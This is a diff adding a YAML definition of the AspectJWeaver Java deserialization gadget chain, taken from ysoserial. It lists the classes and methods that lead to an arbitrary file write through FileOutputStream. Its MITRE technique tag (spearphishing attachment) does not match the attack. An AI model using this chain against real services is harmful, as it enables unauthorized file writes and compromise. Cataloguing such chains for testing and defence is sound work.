@@ -1,0 +1,25 @@
+name: "AspectJWeaver"
+category: "aspectj"
+description: "AspectJWeaver gadget chain using SimpleCache and ReflectiveMethodInvocation"
+jdk_version: "all"
+dependencies:
+  - name: "aspectjweaver"
+    version: "1.9.2"
+exploit_type: "file_write"
+payload_type: "file_write"
+risk_level: 4
+mitre_technique: "T1566.001"
+references:
+  - "https://github.com/frohoff/ysoserial"
+steps:
+  - class_name: "org.aspectj.weaver.tools.cache.SimpleCache"
+    method_name: "get"
+    parameters: []
+  - class_name: "org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap"
+    method_name: "put"
+    parameters: []
+  - class_name: "java.io.FileOutputStream"
+    method_name: "write"
+    parameters:
+      - "{file_path}"
+      - "{file_content}"
